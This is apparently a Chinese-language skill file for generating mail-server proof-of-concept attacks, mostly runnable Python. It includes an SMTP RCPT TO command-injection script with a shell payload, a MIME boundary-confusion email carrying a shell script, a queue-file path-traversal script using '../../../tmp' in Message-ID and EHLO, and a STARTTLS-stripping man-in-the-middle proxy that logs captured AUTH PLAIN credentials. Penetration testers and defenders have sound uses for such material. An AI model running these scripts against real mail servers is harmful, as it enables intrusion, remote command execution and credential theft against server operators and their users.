---
description: 邮服 POC 生成 — netcat SMTP 会话、MIME 多部分测试、队列文件注入、STARTTLS 降级脚本
tags: [mail, poc, smtp, netcat, mime, queue, starttls]
---

# 邮服 POC 生成器 (Mail PoC Generator)

## 触发警觉的信号 (Triggers)

- **netcat 发送 `EHLO test\r\n` 后服务器返回非标准响应码（如 `999`）或超长 Banner**——非标准行为提示自定义/修改过的代码
- **手动构造的 MIME 邮件在 Python `email.parser` 和目标服务器上的解析结果不一致**——解析差异可利用
- **通过 `openssl s_client -connect target:25 -starttls smtp` 连接时，证书主体（CN）与目标域名不匹配**——证书配置错误可能伴随 TLS 实现缺陷
- **Queue 文件目录（如 `/var/spool/postfix/incoming/`）权限为 `drwxrwxrwx`**——队列目录可写，任意文件注入可能
- **发送测试邮件后，在队列目录中发现以用户可控字符串（如主机名）命名的子目录**——路径注入的温床
- **STARTTLS 握手时服务器发送的证书链中包含已撤销（CRL）或自签名证书**——TLS 栈配置宽松，降级攻击更易实施
- **使用 `swaks`（Swiss Army Knife for SMTP）测试时，发现服务器对某些畸形命令返回的信息量过大**——信息泄露或调试模式开启

## 不可跳过的问题链 (Question Chain)

1. **POC 是否需要认证？如果需要，POC 应该包含认证模块还是假设已提供凭据？** 如果需要认证，该漏洞在 Pre-auth 和 Post-auth 的表现是否不同？
2. **MIME 测试的 POC 应该生成 `.eml` 文件直接投递，还是通过 SMTP 会话实时发送？** 通过 SMTP 发送时，`DATA` 阶段是否会对邮件内容进行任何形式的规范化（如换行符转换）从而破坏精心构造的边界？
3. **队列文件注入 POC 中，如何确认注入成功？** 是通过观察文件系统（检查特定路径是否出现文件），还是通过触发队列处理并观察异常行为（如崩溃日志）？
4. **STARTTLS 降级 POC 是作为独立代理运行，还是作为库函数集成到现有 SMTP 客户端中？** 独立代理需要处理 TCP 双向转发，集成模式需要修改客户端的 TLS 协商逻辑。
5. **POC 的验证信号（success indicator）应该选择什么？** DNS 回连、HTTP 请求、本地文件创建、还是进程崩溃？哪种信号在目标环境中最可靠且副作用最小？
6. **如果 POC 触发的是拒绝服务，如何确保测试不会导致生产环境长时间不可用？** 是否需要包含自动恢复机制或超时限制？

## 攻击链闭合 (Attack Chain Closure)

**完整逻辑证明：从 POC 构造到漏洞确认**

### POC 路径 A：netcat 手工 SMTP 会话

```
需求：验证 SMTP 命令注入
    → 构造精确的字节序列：
        "EHLO test\r\n"
        "MAIL FROM:<a@b.com>\r\n"
        "RCPT TO:<victim@x.com; touch /tmp/pwned #>\r\n"
        "DATA\r\n"
        "Subject: test\r\n\r\ntest\r\n.\r\n"
        "QUIT\r\n"
    → 通过 nc 发送，观察：
        ├─ RCPT TO 返回 250 → 注入被接受
        ├─ 服务器队列处理后出现 /tmp/pwned → RCE 确认
        └─ 或：无文件但 DNS 回连触发 → 命令执行确认
```

### POC 路径 B：MIME 多部分结构测试

```
需求：验证 MIME boundary 解析歧义
    → 生成 multipart 邮件：
        Content-Type: multipart/mixed; boundary="A"; boundary="B"
        
        --A\r\n
        Content-Type: text/plain\r\n\r\n
        Gateway sees this\r\n
        --B\r\n
        Content-Type: application/x-sh\r\n\r\n
        #!/bin/sh\r\n
        id > /tmp/mime_poc_result\r\n
        --A--\r\n
    → 投递到目标服务器 → 通过 IMAP/POP3 收取
        → 检查收取的邮件结构（使用 Python email.parser 对比）
            → 若收取的邮件包含 application/x-sh 部分 → 解析歧义确认
```

### POC 路径 C：Queue 文件注入

```
需求：验证队列文件路径穿越
    → 前提：控制 SMTP 会话中的某个标识符（如 hostname / Message-ID）
    → 构造 SMTP 会话：
        EHLO attacker\r\n
        MAIL FROM:<a@b.com>\r\n
        RCPT TO:<c@d.com>\r\n
        DATA\r\n
        Message-Id: ../../../tmp/queue_poc_test\r\n
        \r\n
        test\r\n
        .\r\n
    → 检查 /tmp/queue_poc_test 是否被创建
        → 若存在且属主为邮件服务用户 → 路径穿越确认
```

## 代码示例 (Code Examples)

### POC 模板 1：通用 netcat SMTP 会话生成器

```python
#!/usr/bin/env python3
# poc_smtp_session.py
import socket
import sys
import time

class SMTPSessionPoC:
    def __init__(self, target, port=25, timeout=10):
        self.target = target
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.log = []
    
    def connect(self):
        self.sock.connect((self.target, self.port))
        banner = self.sock.recv(1024).decode()
        self._log("RECV", banner)
        return banner
    
    def send_cmd(self, cmd, wait=0.5):
        self._log("SEND", cmd)
        self.sock.send((cmd + "\r\n").encode())
        time.sleep(wait)
        try:
            resp = self.sock.recv(4096).decode()
            self._log("RECV", resp)
            return resp
        except socket.timeout:
            self._log("RECV", "[TIMEOUT]")
            return ""
    
    def _log(self, direction, data):
        ts = time.strftime("%H:%M:%S")
        for line in data.strip().split("\n"):
            self.log.append(f"[{ts}] {direction}: {line}")
    
    def save_session(self, filename):
        with open(filename, "w") as f:
            f.write("\n".join(self.log))
        print(f"[+] Session saved to {filename}")
    
    def close(self):
        self.sock.close()

# 使用示例：命令注入 POC
def poc_cmd_injection(target, callback_cmd="touch /tmp/pwned"):
    session = SMTPSessionPoC(target)
    session.connect()
    session.send_cmd("EHLO attacker")
    session.send_cmd("MAIL FROM:<attacker@evil.com>")
    
    # 注入命令分隔符
    payload = f"victim@target.com; {callback_cmd} #"
    resp = session.send_cmd(f"RCPT TO:<{payload}>")
    
    if "250" in resp:
        session.send_cmd("DATA")
        session.send_cmd("Subject: POC\r\n\r\nPOC body\r\n.")
    
    session.send_cmd("QUIT")
    session.save_session("poc_cmd_injection.session.log")
    session.close()
    
    print("[+] Check for POC artifact on target (e.g., /tmp/pwned)")

if __name__ == "__main__":
    poc_cmd_injection(sys.argv[1])
```

### POC 模板 2：MIME 多部分测试邮件生成器

```python
#!/usr/bin/env python3
# poc_mime_generator.py
import base64
import random
import string

def generate_mime_poc(strategy="boundary_confusion"):
    """
    生成用于测试 MIME 解析器行为的 POC 邮件
    """
    msg_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    if strategy == "boundary_confusion":
        # 策略：重复 boundary 声明，测试解析器取第一个还是最后一个
        email = f"""Message-Id: <{msg_id}@poc>
From: attacker@poc.local
To: victim@target.com
Subject: MIME Boundary Confusion Test
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="first"
Content-Type: multipart/mixed; boundary="second"

--first
Content-Type: text/plain

This part is seen by parsers choosing the first boundary.

--second
Content-Type: application/x-sh
Content-Disposition: attachment; filename="test.sh"

#!/bin/sh
echo "If you see this, parser chose second boundary"

--first--
"""
    
    elif strategy == "nested_depth":
        # 策略：极端嵌套深度测试
        depth = 1000
        headers = f"""Message-Id: <{msg_id}@poc>
From: attacker@poc.local
To: victim@target.com
Subject: MIME Nested Depth Test
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="L0"

"""
        body = ""
        for i in range(depth):
            body += f"--L{i}\nContent-Type: multipart/mixed; boundary=\"L{i+1}\"\n\n"
        body += f"--L{depth}\nContent-Type: text/plain\n\nDeepest part\n"
        for i in range(depth, -1, -1):
            body += f"--L{i}--\n"
        email = headers + body
    
    return email, msg_id

def save_poc_email(email_body, filename="poc_test.eml"):
    with open(filename, "w") as f:
        f.write(email_body)
    print(f"[+] POC email saved to {filename}")
```

### POC 模板 3：Queue 文件注入验证

```python
#!/usr/bin/env python3
# poc_queue_injection.py
import socket
import sys
import time

def poc_queue_path_traversal(target_smtp, traversal_path="../../../tmp/poc_queue"):
    """
    前提：目标使用 Message-ID 或主机名构造队列文件路径
    通过 EHLO 中的主机名或自定义 Message-ID 头注入路径穿越
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_smtp, 25))
    s.settimeout(5)
    
    def send(cmd, wait=0.3):
        s.send((cmd + "\r\n").encode())
        time.sleep(wait)
        try:
            return s.recv(1024).decode()
        except:
            return ""
    
    send(f"EHLO {traversal_path}")
    send("MAIL FROM:<test@test.com>")
    send("RCPT TO:<test@test.com>")
    send("DATA")
    email_data = f"""Message-Id: <{traversal_path}>
From: test@test.com
To: test@test.com
Subject: Queue Injection

Test
."""
    s.send((email_data + "\r\n").encode())
    time.sleep(0.5)
    
    send("QUIT")
    s.close()
    
    print(f"[+] Queue injection attempt complete.")
    print(f"[+] Check if path was created/influenced: {traversal_path}")

if __name__ == "__main__":
    poc_queue_path_traversal(sys.argv[1], sys.argv[2] if len(sys.argv)>2 else "../../../tmp/poc_queue")
```

### POC 模板 4：STARTTLS 降级自动化脚本

```python
#!/usr/bin/env python3
# poc_starttls_downgrade.py
import socket
import threading
import sys

class STARTTLSDowngradePoC:
    def __init__(self, listen_port, backend_host, backend_port):
        self.listen_port = listen_port
        self.backend_host = backend_host
        self.backend_port = backend_port
        self.captured_credentials = []
    
    def mitm_worker(self, client_sock, addr):
        print(f"[+] Connection from {addr}")
        
        backend = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backend.connect((self.backend_host, self.backend_port))
        
        # 客户端 -> 后端（篡改 STARTTLS）
        def client_to_backend():
            while True:
                data = client_sock.recv(4096)
                if not data:
                    break
                backend.send(data)
        
        # 后端 -> 客户端（删除 STARTTLS 能力）
        def backend_to_client():
            while True:
                data = backend.recv(4096)
                if not data:
                    break
                
                # 关键篡改点：从 EHLO 响应中移除 STARTTLS
                if b"250-STARTTLS" in data or b"250 STARTTLS" in data:
                    data = data.replace(b"250-STARTTLS\r\n", b"")
                    data = data.replace(b"250 STARTTLS\r\n", b"")
                    print("[MITM] Stripped STARTTLS from server response")
                
                # 捕获明文 AUTH PLAIN 凭据
                if b"AUTH PLAIN " in data:
                    cred_line = data.split(b"AUTH PLAIN ")[1].split(b"\r\n")[0]
                    self.captured_credentials.append(cred_line)
                    print(f"[MITM] Captured credentials: {cred_line}")
                
                client_sock.send(data)
        
        t1 = threading.Thread(target=client_to_backend)
        t2 = threading.Thread(target=backend_to_client)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    
    def run(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", self.listen_port))
        listener.listen(5)
        print(f"[*] STARTTLS Downgrade PoC listening on 0.0.0.0:{self.listen_port}")
        print(f"[*] Forwarding to {self.backend_host}:{self.backend_port}")
        
        while True:
            client, addr = listener.accept()
            t = threading.Thread(target=self.mitm_worker, args=(client, addr))
            t.daemon = True
            t.start()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <listen_port> <backend_host> <backend_port>")
        sys.exit(1)
    
    poc = STARTTLSDowngradePoC(int(sys.argv[1]), sys.argv[2], int(sys.argv[3]))
    poc.run()
```

## POC 交付标准

| 检查项 | 要求 | 验证方法 |
|-------|------|---------|
| 可复现性 | 不依赖特定时序或竞态 | 连续运行 10 次均成功 |
| 最小化 | 去除与漏洞无关的所有字节 | diff 确认无冗余数据 |
| 安全性 | 默认不造成持久破坏 | 使用 `touch /tmp/` 而非 `rm` |
| 可检测性 | 明确的 success/failure 指示 | 返回码、文件、网络信号 |
| 文档化 | 包含前置条件和预期结果 | 头部注释说明 |
| 兼容性 | 支持 Python 3.11+ 或标准 shell | 不依赖第三方库（除标准库） |
